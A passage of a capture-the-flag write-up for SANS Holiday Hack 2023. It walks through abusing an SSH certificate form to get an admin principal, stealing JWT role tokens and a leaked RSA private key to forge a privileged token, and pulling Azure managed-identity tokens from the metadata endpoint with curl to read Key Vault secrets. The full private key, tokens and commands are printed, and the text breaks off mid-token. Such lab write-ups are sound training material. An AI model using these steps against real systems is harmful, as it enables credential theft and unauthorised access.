+      spinnerElement.style.display = "none";
+      outputElement.innerText = error.toString();
+      outputElement.classList.add("error-output");
+      outputElement.classList.remove("success-output");
+      outputElement.style.display = "block";
+    });
+}
+```
+
+Now in your browser console, type in `submitForm = ` and then paste the entire submitForm function from above. Press enter. The code should now be saved in the browser.
+
+Now paste your public key into the form, and press submit. You should now see a response page like this showing the principal of admin:
+
+![response](images/sshenanigans/response.png)
+
+Here is the certificate we get back from the webapp:
+
+```json
+{
+  "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcyNTYyNTIxMzA1MzAwMDcxNDI4MjA0ODU2MzYwOTAxNjA3OTYyNTkAAAADAQABAAABgQDePX2WwJ2PxWNueKDlrZmi/TDHlBq+Wpq9sIYr7k2ZBocd2OPaLqgcXLBKcjmVEGzOTxrnKQJ1rhRnd8ZnmM0KPrvEtfE3EcCOK/7H5esxU5GjHPN0w/ZevyikoGFpteBrRIePiiEW7QNrqeBolwgar0Z49a+WUvjDlp5ANhP3NMSzOnrr+0CwgWwsPRFVd3PVXaQ+9eV9W3prlb3g+R/dpkWU4yKGcKZmMqLxm9ubjcZwfsqlBD//fN/ogWD8z144jw1ktyRrinSIQoazoIM6HVTZym8JBLvHe76XkJOU0DzDWuu1OkAZGOZgk2kGQbIneBc6jhkAJMoQXUxLBf/lVbQUK4bYflDc65crXY55fSUNfttOafLiIUQpZMy03XTvJK7nZvzcnssTK+XgKqAV68IstWS/Aa8GuD2iYu2Njpwk1sEJBlwIwo/ocU8geq6PEk/Ra+9OQLvZAqV15ZoKLCWkfXG38l1ese+AbklaNsZwSIjcIVG6ZCubFgAGu6cAAAAAAAAAAQAAAAEAAAAkZWRmYmRhYjAtMzA4Yi00ZjJmLThjMzUtODkzOWMxYjJlOTBjAAAACQAAAAVhZG1pbgAAAABlc8M0AAAAAGWYrmAAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEBYqgXDRKSruPxAgVfkpQaQTI8IjIpsFBnjhCvnzJ6D6VDmDN8U4RODeAUHPt0t9Z5JHVLmsddrZry6IX0rthIK ",
+  "principal": "admin"
+}
+```
+
+Now paste this `ssh_cert` data into a file in your .ssh directory and save it.
+
+Now let's SSH in using our new certificate file:
+`ssh -i ~/.ssh/<privatekeyfilename> -i ~/.ssh/<adminprincipalcertificatefilename> alabaster@ssh-server-vm.santaworkshopgeeseislands.org`
+
+We're in. Now we can see theres a file called `alabaster_todo.md` in our home directory.
+
+![alabaster shell](images/sshenanigans/alabaster.png)
+
+Here is alabasters todo in markdown:
+
+```md
+### Geese Islands IT & Security Todo List
+
+- [x] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
+- [x] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
+- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
+- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
+- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
+- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
+- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
+```
+
+**The Flag:**
+
+What type of Cookie Cache is Alabaster planning to implement?
+`Gingerbread`
+
+## The Captain's Comms
+
+### Objective
+
+The Captain suspects that a group of miscreants sailing about the islands plan to come ashore and cause trouble. The Captain would like to find their anticipated "go-time" frequency, the planned date and hour for their incursion, and lure the miscreants ashore at a time when the island authorities are sufficiently prepared and ready by transmitting a message announcing a new "go-time" which is four hours earlier than what the miscreants have planned.
+
+### Hint 1
+
+I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.
+
+### Hint 2
+
+Web Interception proxies like Burp and Zap make web sites fun!
+
+### Hint 3
+
+Find a private key, update an existing JWT!
+
+### Hint 4
+
+A great introduction to JSON Web Tokens is available from [Auth0](https://jwt.io/introduction).
+
+### Hint 5
+
+I've seen the Captain with [his Journal](https://elfhunt.org/static/images/captainsJournal.png) visiting Pixel Island!
+
+#### Captains Journal
+
+In the journal entry we found, he mentions that he has been promoted to the ROLE of `GeeseIslandsSuperChiefCommunicationsOfficer`. This must be a role we are targeting to assume with a JWT to make the transmission.
+
+### Solution
+
+Using Burp as a proxy, upon messing around with the site for a few minutes, I found the following tokens in the Burp http logs.
+
+**Token 1:**
+
+```
+Set-Cookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg
+```
+
+The JWT part decodes to this payload:
+
+```json
+{
+  "iss": "HHC 2023 Captain's Comms",
+  "iat": 1699485795.3403327,
+  "exp": 1809937395.3403327,
+  "aud": "Holiday Hack 2023",
+  "role": "radioUser"
+}
+```
+
+**Token 2:**
+
+```
+Set-Cookie: CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6Ijc1NzQ2OWU0LWFjMzUtNGYxMS1iYTQ3LTMzNWI0NDIyNTM5MSJ9.ZXjgKg.kraUjTHiSGHCsnldfyJ4fuIMSH
+```
+
+The JWT decodes to this payload:
+
+```s
+"ex�*"
+```
+
+Not sure what this means.
+
+**Token 3:**
+
+```s
+Set-Cookie: CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjQ5NzY3NjJkLWZlMDQtNDFhOS1hMDUxLWZiODFiNWI5ODI3YiJ9.ZXjgMw.OB9HBkJh6FbZZ4e8T8APxqnXiM
+```
+
+```s
+"ex�3"
+```
+
+Not sure what this means either.
+
+Now, in the game itself we can see 3 papers on the radio operators desk. The first one says something about there being a rMonitor.tok file created in the /jwtDefault directory. If we go to `captainscomms.com/jwtDefault/rMonitor.tok`, we get an `Invalid authorization token provided.` error. Looking at the HTTP logs in burp, we can see that no Authorization header was provided since we simply navigated there with the browser url. Now, I send the same request again, but edit the Authorization header to contain our `radioUser` token from above and boom, we got the token:
+
+**radioMonitor Token:**
+
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
+```
+
+**Payload:**
+
+```json
+{
+  "iss": "HHC 2023 Captain's Comms",
+  "iat": 1699485795.3403327,
+  "exp": 1809937395.3403327,
+  "aud": "Holiday Hack 2023",
+  "role": "radioMonitor"
+}
+```
+
+Using the radioMonitor token, we can monitor the "waterfall" by clicking on the waterfall display in game, intercepting the request with Burp, and providing the radioMonitor token in the Authorization Header.
+
+![open waterfall](images/captains_comms/open_waterfall.png)
+
+Now after modifying the Authorization header and turning Burp intercept off, the waterfall should be shown.
+
+![waterfall](images/captains_comms/waterfall.png)
+
+If we try and click on any of the signals on the waterfall, we are presented with an error message saying `Must be radioDecoder Role!`.
+
+In the "Owners Manual Volume 1" book above the desk, we see mention of a radioUser role and well as a radioDecoder role.
+
+![owners manual vol1](images/captains_comms//ownMan1.png)
+
+We already have the radioMonitor token (which I assume is the radioUser role), so lets see if we can find the radioDecoder role token.
+
+The other captains note from above hints at all keys being stored in a folder jwtDefault with the same naming convention as rMonitor.tok, I assumed for the radioDecoder role, the filename must be rDecoder.tok.
+
+https://captainscomms.com/jwtDefault/rDecoder.tok
+
+It returns a page saying "Invalid authorization token provided." so lets intercept the request using Burp and provide the radioMonitor token.
+
+It worked!:
+
+rDecoder.tok:
+
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg
+```
+
+**Payload:**
+
+```json
+{
+  "iss": "HHC 2023 Captain's Comms",
+  "iat": 1699485795.3403327,
+  "exp": 1809937395.3403327,
+  "aud": "Holiday Hack 2023",
+  "role": "radioDecoder"
+}
+```
+
+#### Public Key
+
+Doing the same thing we did to find the rMonitor token, we can get the captains public key by reading his 3rd note (far right) on his desk:
+
+![chatnpt list](images/captains_comms//chatNPTList.png)
+
+It mentions that capsPubKey.key is in the same folder the roleMonitor token was in. Lets try the following URL and see if it works.
+
+https://captainscomms.com/jwtDefault/keys/capsPubKey.key
+
+Yes it does:
+
+```s
+-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6 uQIDAQAB -----END PUBLIC KEY-----
+```
+
+Now lets see if we can get the private key using the same naming convention. Usually private keys dont have a file extension.
+
+https://captainscomms.com/jwtDefault/keys/capsPrivKey
+
+This didn't work. I tried a bunch of different enumerations but none of them did either. Lets see if we can find anything else out.
+
+#### Private Key
+
+Now lets try and decode these signals in the waterfall.
+
+##### CW Signal
+
+`... CQ CQ CQ DE KH644 -- SILLY CAPTAIN WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R`
+
+Lets go see if we can get the private key.
+
+Using the same naming convention as capsPubKey.key, I found it:
+https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key
+
+Another page showing `Invalid authorization token provided.` so lets intercept again with Burp and provide the token (rDecoder).
+
+Here we go:
+
+```s
+-----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q 5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4 MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay 4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3 VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj 9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP /dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N /pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9 4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut UdQXV73mNwnYl0RQmBnDOl+i -----END PRIVATE KEY-----
+```
+
+I had to use the rDecoder token, as the rMonitor token did not work to authenticate this.
+
+Now before we try to sign our own token, lets try and decode the other bands on the waterfall.
+
+##### NUM Signal:
+
+The NUM signal gave us the following data:
+
+```s
+{music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music}
+```
+
+The 3rd book on the shelf says that this is a numbers station broadcast and that this link should be useful https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher/.
+
+Not completely sure how to get the go date and time, but judging by the message format in the above link, the actual message is the part between the gong chimes. "12249 12249 16009 16009 12249 12249 16009 16009". Traditionally, a numbers station message would be decoded by a spy using a one time pad, but since we dont have that there must be another way. If we just look at the numbers themselves, we can see that there are only two variations (12249 and 16009) which are repeated 4 times each. Each of these numbers has a 9 on the end, and since numbers stations typically broadcast 5 digit numbers, its possible this 9 was added on just to conform to that standard. Assuming that, we take a look at the resulting numbers (1224 and 1600). My assumption is that the first is the date (Dec 24) and the second is the time (1600 or 4pm). Lets continue with this assumption and see if it works.
+
+Knowing this, the time we want to transmit (4 hours earlier) would be Dec 24, 1200.
+
+##### FX Signal:
+
+Image of geese islands, showing the frequency 10426Hz.
+
+![fx signal](images/captains_comms/fx.png)
+
+This must be the frequency we need to transmit our message on.
+
+#### Create JWT
+
+Lets now try and sign our own JWT using the private key.
+
+The format should be as follows:
+
+Header:
+
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+```
+
+Payload:
+
+```json
+{
+  "iss": "HHC 2023 Captain's Comms",
+  "iat": 1699485795.3403327,
+  "exp": 1809937395.3403327,
+  "aud": "Holiday Hack 2023",
+  "role": "GeeseIslandsSuperChiefCommunicationsOfficer"
+}
+```
+
+The `GeeseIslandsSuperChiefCommunicationsOfficer` role was assumed based on the captains journal from hint 5.
+
+Ok, using a python script in captains_comms/create_token.py I created the following token:
+
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
+```
+
+Link to python library here:
+https://pyjwt.readthedocs.io/en/latest/usage.html#encoding-decoding-tokens-with-rs256-rsa
+
+Lets see if it works by trying to access radio transmitter. Again, we must intercept this request with Burp and edit the Authorization header to put our new token in.
+
+It worked :)
+
+Now, we need to present the frequency, go time and date to be transmitted. I think it should be:
+Frequency: 10426Hz
+Go-Date: 1224
+Go-Time: 1200
+
+![transmitter](images/captains_comms/transmitter.png)
+
+It worked!!!!!!!!
+
+![success](images/captains_comms/success.png)
+
+## Active Directory
+
+### Objective
+
+Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?
+
+### Hint 1
+
+It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.
+
+### Hint 2
+
+Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.
+
+### Solution
+
+To solve this challenge, we need to connect back in to Alabaster Snowballs SSH server. This time we will try and find a vulnerability in his Active Directory server.
+
+I imagine we need to use the azure API again, so lets get a token using the Azure API (same method from Certificate SSHenanigans).
+
+```
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
+```
+
+```json
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI1ODY0MTIsIm5iZiI6MTcwMjU4NjQxMiwiZXhwIjoxNzAyNjczMTEyLCJhaW8iOiJFMlZnWVBCY1hiMTl3WDltdmFER3VaMVgvYjd2QUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQUmFIdWphd2EwaUxlWTU4WDhSR0FBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.nFIRI2ezApHq7GausM0sCyigTQS5rYBmQr2xeC10DGCeTrXp35d2Buu119812k8h0sMvyKS294ZQzQwhI9PH4Y-OhaNl3LL1Dq4dG1IiYJ9W7PQk1Ymuw1QZt3Pbe5OOib4a5LYEwn__AFPZ1Np2I8hJUnzHDsdjFYRgofENnJnr98HaMf8-slj6ImkGB_HYIiG5HmvvZaD9hWBANFu7cPcRhghhxF29PN_FV3tx4iSW-hcHYju2N_3g9VC_fzd7Jd-SMKYc0poN3b_SfedgL_Y0CirJaxGYhBIotwSYm2rKKZA-hDuECaTbiJ620BGgrWNaCHLUTT7VbnLaFiQ6wQ",
+  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
+  "expires_in": "85178",
+  "expires_on": "1702673112",
+  "ext_expires_in": "86399",
+  "not_before": "1702586412",
+  "resource": "https://management.azure.com/",
+  "token_type": "Bearer"
+}
+```
+
+subscriptionId: 2b0942f3-9bca-484b-a508-abdae2db5e64
+
+A good first move would be to figure out what permissions we have. We can use the following API endpoint.
+
+List Permissions for Resource Group:
+https://management.azure.com/subscriptions/{{subscription_id}}/resourcegroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=2022-04-01
+
+```
+curl https://management.azure.com/subscriptions/{{subscription_id}}/resourcegroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=2022-04-01 -H "Authorization:Bearer {TOKEN_HERE}"
+```
+
+```json
+{
+  "value": [
+    {
+      "actions": [
+        "Microsoft.KeyVault/vaults/read",
+        "Microsoft.KeyVault/vaults/secrets/read",
+        "Microsoft.Web/sites/sourcecontrols/Read",
+        "microsoft.web/sites/functions/read",
+        "Microsoft.Resources/subscriptions/resourceGroups/read"
+      ],
+      "notActions": [],
+      "dataActions": [
+        "Microsoft.KeyVault/vaults/secrets/getSecret/action",
+        "Microsoft.KeyVault/vaults/secrets/readMetadata/action"
+      ],
+      "notDataActions": []
+    }
+  ]
+}
+```
+
+Interesting. It seems we have permissions to read secrets from KeyVault. Lets try and find these KeyVaults.
+
+I found the following API endpoint which allows us to interact with the KeyVaults.
+
+Key Vault -> Vaults -> List
+https://management.azure.com/subscriptions/{subscriptionId}/resources?$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2015-11-01
+
+```
+curl "https://management.azure.com/subscriptions/{subscriptionId}/resources?$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2015-11-01" -H "Authorization:Bearer {TOKEN_HERE}"
+```
+
+```json
+{
+  "value": [
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
+      "name": "northpole-it-kv",
+      "type": "Microsoft.KeyVault/vaults",
+      "location": "eastus",
+      "tags": {}
+    },
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
+      "name": "northpole-ssh-certs-kv",
+      "type": "Microsoft.KeyVault/vaults",
+      "location": "eastus",
+      "tags": {}
+    }
+  ]
+}
+```
+
+Lets try and use our Get Secrets permissions.
+
+Base URL:
+https://myvault.vault.azure.net//secrets?maxresults=1&api-version=7.4
+
+Add in our data:
+https://northpole-it-kv.vault.azure.net//secrets?maxresults=1&api-version=7.4
+
+```
+curl https://northpole-it-kv.vault.azure.net//secrets?maxresults=1&api-version=7.4 -H "Authorization:Bearer {TOKEN_HERE}"
+```
+
+The Request is working but I keep getting this error:
+
+```json
+{
+  "error": {
+    "code": "Unauthorized",
+    "message": "AKV10022: Invalid audience. Expected https://vault.azure.net, found: https://management.azure.com/."
+  }
+}
+```
+
+Looks like we need to get a new token with different audience:
+
+This is the original request for a token from management.azure.com:
+
+```
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
+```
+
+We need to change our audience from management.azure.com to vault.azure.net and re-send the request:
+
+```
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s
+```
+
+```json
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI1OTM2NDEsIm5iZiI6MTcwMjU5MzY0MSwiZXhwIjoxNzAyNjgwMzQxLCJhaW8iOiJFMlZnWUhESWY2UHgzZnZ2ZnAzdFFSWXpvbDFUQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiY2tFSFB3X2dsazZXRFVkOW1LUnZBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvb